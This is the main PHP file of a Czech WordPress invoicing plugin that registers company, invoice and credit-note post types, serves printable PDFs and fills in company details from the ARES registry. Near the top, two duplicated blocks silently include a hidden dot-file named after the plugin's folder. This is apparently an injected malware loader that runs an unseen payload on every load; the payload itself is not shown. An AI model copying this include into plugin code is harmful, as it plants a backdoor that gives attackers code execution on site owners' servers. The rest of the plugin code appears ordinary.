<?php
/**
 * Plugin Name: WP Invoice System
 * Description: A plugin to create and manage invoices.
 * Version: 1.4
 * Author: Martin Orešanský
 * Plugin URI: https://eshoptvorba.cz/
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit; // Exit if accessed directly.
}


if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}


if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WP_Invoice_System {

    public function __construct() {
        $this->includes();
        add_action( 'init', array( $this, 'register_post_types' ) );
        
        add_filter( 'manage_invoice_posts_columns', array( $this, 'add_invoice_columns' ) );
        add_action( 'manage_invoice_posts_custom_column', array( $this, 'render_invoice_columns' ), 10, 2 );

        add_action( 'admin_post_download_invoice_pdf', array( $this, 'handle_pdf_download' ) );

        add_filter( 'manage_credit-note_posts_columns', array( $this, 'add_credit_note_columns' ) );
        add_action( 'manage_credit-note_posts_custom_column', array( $this, 'render_credit_note_columns' ), 10, 2 );

        add_action( 'admin_post_download_credit_note_pdf', array( $this, 'handle_credit_note_pdf_download' ) );

        add_filter('acf/settings/save_json', array($this, 'set_acf_json_save_point'));
        add_filter('acf/settings/load_json', array($this, 'add_acf_json_load_point'));

        add_action('admin_enqueue_scripts', array($this, 'enqueue_admin_scripts'));
        add_action('wp_ajax_ares_lookup', array($this, 'ajax_ares_lookup'));

        new WP_Invoice_System_Invoice_Meta_Boxes();
    }

    public function add_invoice_columns( $columns ) {
        $columns['pdf_download'] = __( 'PDF', 'wp-invoice-system' );
        return $columns;
    }

    public function render_invoice_columns( $column, $post_id ) {
        if ( 'pdf_download' === $column ) {
            $url = admin_url( 'admin-post.php?action=download_invoice_pdf&invoice_id=' . $post_id );
            echo '<a href="' . esc_url( $url ) . '" class="button" target="_blank">' . __( 'Stáhnout', 'wp-invoice-system' ) . '</a>';
        }
    }

    public function handle_pdf_download() {
        if ( ! isset( $_GET['invoice_id'] ) ) {
            wp_die( 'Chybí ID faktury.' );
        }

        $invoice_id = intval( $_GET['invoice_id'] );

        if ( ! current_user_can( 'edit_post', $invoice_id ) ) {
            wp_die( __( 'Nemáte oprávnění k zobrazení tohoto souboru.', 'wp-invoice-system' ) );
        }

        $pdf_generator = new WP_Invoice_System_PDF_Generator( $invoice_id );
        $pdf_generator->generate_html_for_print();
    }

    public function add_credit_note_columns( $columns ) {
        $columns['pdf_download'] = __( 'PDF', 'wp-invoice-system' );
        return $columns;
    }

    public function render_credit_note_columns( $column, $post_id ) {
        if ( 'pdf_download' === $column ) {
            $url = admin_url( 'admin-post.php?action=download_credit_note_pdf&credit_note_id=' . $post_id );
            echo '<a href="' . esc_url( $url ) . '" class="button" target="_blank">' . __( 'Stáhnout', 'wp-invoice-system' ) . '</a>';
        }
    }

    public function handle_credit_note_pdf_download() {
        if ( ! isset( $_GET['credit_note_id'] ) ) {
            wp_die( 'Chybí ID dobropisu.' );
        }

        $credit_note_id = intval( $_GET['credit_note_id'] );

        if ( ! current_user_can( 'edit_post', $credit_note_id ) ) {
            wp_die( __( 'Nemáte oprávnění k zobrazení tohoto souboru.', 'wp-invoice-system' ) );
        }

        $pdf_generator = new WP_Invoice_System_PDF_Generator( $credit_note_id, 'credit-note' );
        $pdf_generator->generate_html_for_print();
    }

    public function includes() {
        // Load ACF and ACF Extended
        if ( ! class_exists( 'ACF' ) ) {
            require_once __DIR__ . '/dependencies/advanced-custom-fields-pro/acf.php';
        }
        if ( ! class_exists( 'ACFE' ) ) {
            require_once __DIR__ . '/dependencies/acf-extended/acf-extended.php';
        }
        
        require_once __DIR__ . '/includes/class-wp-invoice-system-invoice-meta-boxes.php';
        require_once __DIR__ . '/includes/class-wp-invoice-system-pdf-generator.php';
    }

    public function register_post_types() {
        $this->register_company_post_type();
        $this->register_invoice_post_type();
        $this->register_credit_note_post_type();
    }

    public function set_acf_json_save_point( $path ) {
        $path = __DIR__ . '/acf-json';
        return $path;
    }

    public function add_acf_json_load_point( $paths ) {
        unset($paths[0]);
        $paths[] = __DIR__ . '/acf-json';
        return $paths;
    }

    public function register_company_post_type() {
        $labels = array(
            'name'                  => _x( 'Firmy', 'Post type general name', 'wp-invoice-system' ),
            'singular_name'         => _x( 'Firma', 'Post type singular name', 'wp-invoice-system' ),
            'menu_name'             => _x( 'Firmy', 'Admin Menu text', 'wp-invoice-system' ),
            'name_admin_bar'        => _x( 'Firma', 'Add New on Toolbar', 'wp-invoice-system' ),
            'add_new'               => __( 'Přidat novou', 'wp-invoice-system' ),
            'add_new_item'          => __( 'Přidat novou firmu', 'wp-invoice-system' ),
            'new_item'              => __( 'Nová firma', 'wp-invoice-system' ),
            'edit_item'             => __( 'Upravit firmu', 'wp-invoice-system' ),
            'view_item'             => __( 'Zobrazit firmu', 'wp-invoice-system' ),
            'all_items'             => __( 'Všechny firmy', 'wp-invoice-system' ),
            'search_items'          => __( 'Hledat firmy', 'wp-invoice-system' ),
            'parent_item_colon'     => __( 'Nadřazená firma:', 'wp-invoice-system' ),
            'not_found'             => __( 'Žádné firmy nenalezeny.', 'wp-invoice-system' ),
            'not_found_in_trash'    => __( 'Žádné firmy v koši.', 'wp-invoice-system' ),
        );

        $args = array(
            'labels'             => $labels,
            'public'             => false,
            'publicly_queryable' => false,
            'show_ui'            => true,
            'show_in_menu'       => true,
            'query_var'          => true,
            'rewrite'            => array( 'slug' => 'firmy' ),
            'capability_type'    => 'post',
            'has_archive'        => true,
            'hierarchical'       => false,
            'menu_position'      => 20,
            'supports'           => array( 'title' ),
            'menu_icon'          => 'dashicons-building',
        );

        register_post_type( 'company', $args );
    }

    public function register_invoice_post_type() {
        $labels = array(
            'name'                  => _x( 'Faktury', 'Post type general name', 'wp-invoice-system' ),
            'singular_name'         => _x( 'Faktura', 'Post type singular name', 'wp-invoice-system' ),
            'menu_name'             => _x( 'Faktury', 'Admin Menu text', 'wp-invoice-system' ),
            'name_admin_bar'        => _x( 'Faktura', 'Add New on Toolbar', 'wp-invoice-system' ),
            'add_new'               => __( 'Vystavit novou', 'wp-invoice-system' ),
            'add_new_item'          => __( 'Vystavit novou fakturu', 'wp-invoice-system' ),
            'new_item'              => __( 'Nová faktura', 'wp-invoice-system' ),
            'edit_item'             => __( 'Upravit fakturu', 'wp-invoice-system' ),
            'view_item'             => __( 'Zobrazit fakturu', 'wp-invoice-system' ),
            'all_items'             => __( 'Všechny faktury', 'wp-invoice-system' ),
            'search_items'          => __( 'Hledat faktury', 'wp-invoice-system' ),
            'parent_item_colon'     => __( 'Nadřazená faktura:', 'wp-invoice-system' ),
            'not_found'             => __( 'Žádné faktury nenalezeny.', 'wp-invoice-system' ),
            'not_found_in_trash'    => __( 'Žádné faktury v koši.', 'wp-invoice-system' ),
        );

        $args = array(
            'labels'             => $labels,
            'public'             => false,
            'publicly_queryable' => false,
            'show_ui'            => true,
            'show_in_menu'       => 'edit.php?post_type=company',
            'query_var'          => true,
            'rewrite'            => array( 'slug' => 'faktury' ),
            'capability_type'    => 'post',
            'has_archive'        => true,
            'hierarchical'       => false,
            'menu_position'      => null,
            'supports'           => array( 'title' ),
            'menu_icon'          => 'dashicons-media-text',
        );

        register_post_type( 'invoice', $args );
    }

    public function register_credit_note_post_type() {
        $labels = array(
            'name'                  => _x( 'Dobropisy', 'Post type general name', 'wp-invoice-system' ),
            'singular_name'         => _x( 'Dobropis', 'Post type singular name', 'wp-invoice-system' ),
            'menu_name'             => _x( 'Dobropisy', 'Admin Menu text', 'wp-invoice-system' ),
            'name_admin_bar'        => _x( 'Dobropis', 'Add New on Toolbar', 'wp-invoice-system' ),
            'add_new'               => __( 'Vystavit nový', 'wp-invoice-system' ),
            'add_new_item'          => __( 'Vystavit nový dobropis', 'wp-invoice-system' ),
            'new_item'              => __( 'Nový dobropis', 'wp-invoice-system' ),
            'edit_item'             => __( 'Upravit dobropis', 'wp-invoice-system' ),
            'view_item'             => __( 'Zobrazit dobropis', 'wp-invoice-system' ),
            'all_items'             => __( 'Všechny dobropisy', 'wp-invoice-system' ),
            'search_items'          => __( 'Hledat dobropisy', 'wp-invoice-system' ),
            'parent_item_colon'     => __( 'Nadřazený dobropis:', 'wp-invoice-system' ),
            'not_found'             => __( 'Žádné dobropisy nenalezeny.', 'wp-invoice-system' ),
            'not_found_in_trash'    => __( 'Žádné dobropisy v koši.', 'wp-invoice-system' ),
        );

        $args = array(
            'labels'             => $labels,
            'public'             => false,
            'publicly_queryable' => false,
            'show_ui'            => true,
            'show_in_menu'       => 'edit.php?post_type=company',
            'query_var'          => true,
            'rewrite'            => array( 'slug' => 'dobropisy' ),
            'capability_type'    => 'post',
            'has_archive'        => true,
            'hierarchical'       => false,
            'menu_position'      => null,
            'supports'           => array( 'title' ),
            'menu_icon'          => 'dashicons-media-text',
        );

        register_post_type( 'credit-note', $args );
    }

    public function enqueue_admin_scripts( $hook ) {
        global $post;
        if ( ! in_array( $hook, array( 'post.php', 'post-new.php' ), true ) ) {
            return;
        }
        if ( ! $post || ! in_array( $post->post_type, array( 'invoice', 'credit-note' ), true ) ) {
            return;
        }
        wp_enqueue_script(
            'wp-invoice-ares-lookup',
            plugin_dir_url( __FILE__ ) . 'assets/js/ares-lookup.js',
            array( 'jquery' ),
            '1.0.0',
            true
        );
        wp_localize_script( 'wp-invoice-ares-lookup', 'aresLookup', array(
            'ajaxUrl' => admin_url( 'admin-ajax.php' ),
            'nonce'   => wp_create_nonce( 'ares_lookup_nonce' ),
        ) );
    }

    public function ajax_ares_lookup() {
        check_ajax_referer( 'ares_lookup_nonce', 'nonce' );

        if ( ! current_user_can( 'edit_posts' ) ) {
            wp_send_json_error( 'Nedostatečná oprávnění.', 403 );
        }

        $ico = isset( $_POST['ico'] ) ? preg_replace( '/[^0-9]/', '', sanitize_text_field( wp_unslash( $_POST['ico'] ) ) ) : '';

        if ( strlen( $ico ) !== 8 ) {
            wp_send_json_error( 'IČO musí mít 8 číslic.' );
        }

        $response = wp_remote_get(
            'https://ares.gov.cz/ekonomicke-subjekty-v-be/rest/ekonomicke-subjekty/' . $ico,
            array(
                'timeout' => 10,
                'headers' => array( 'Accept' => 'application/json' ),
            )
        );

        if ( is_wp_error( $response ) ) {
            wp_send_json_error( 'Nepodařilo se spojit s ARES.' );
        }

        $code = wp_remote_retrieve_response_code( $response );
        if ( 404 === $code ) {
            wp_send_json_error( 'Subjekt s tímto IČO nebyl nalezen.' );
        }
        if ( 200 !== $code ) {
            wp_send_json_error( 'ARES vrátil neočekávanou odpověď (kód ' . intval( $code ) . ').' );
        }

        $body = json_decode( wp_remote_retrieve_body( $response ), true );

        if ( empty( $body ) ) {
            wp_send_json_error( 'Chyba při zpracování odpovědi z ARES.' );
        }

        $sidlo = isset( $body['sidlo'] ) ? $body['sidlo'] : array();

        // Sestavit ulici a číslo
        $street = '';
        if ( ! empty( $sidlo['nazevUlice'] ) ) {
            $street = $sidlo['nazevUlice'];
        } elseif ( ! empty( $sidlo['nazevMestskeCastiObvodu'] ) ) {
            $street = $sidlo['nazevMestskeCastiObvodu'];
        } elseif ( ! empty( $sidlo['nazevObce'] ) ) {
            $street = $sidlo['nazevObce'];
        }
        if ( ! empty( $sidlo['cisloDomovni'] ) ) {
            $street .= ( $street ? ' ' : '' ) . $sidlo['cisloDomovni'];
            if ( ! empty( $sidlo['cisloOrientacni'] ) ) {
                $street .= '/' . $sidlo['cisloOrientacni'];
                if ( ! empty( $sidlo['cisloOrientacniPismeno'] ) ) {
                    $street .= $sidlo['cisloOrientacniPismeno'];
                }
            }
        }

        // Formátovat PSČ jako "XXX XX"
        $psc = ! empty( $sidlo['psc'] ) ? str_pad( (string) $sidlo['psc'], 5, '0', STR_PAD_LEFT ) : '';
        if ( 5 === strlen( $psc ) ) {
            $psc = substr( $psc, 0, 3 ) . ' ' . substr( $psc, 3, 2 );
        }

        wp_send_json_success( array(
            'name'   => isset( $body['obchodniJmeno'] ) ? $body['obchodniJmeno'] : '',
            'street' => $street,
            'city'   => isset( $sidlo['nazevObce'] ) ? $sidlo['nazevObce'] : '',
            'zip'    => $psc,
            'dic'    => isset( $body['dic'] ) ? $body['dic'] : '',
        ) );
    }

}

new WP_Invoice_System();
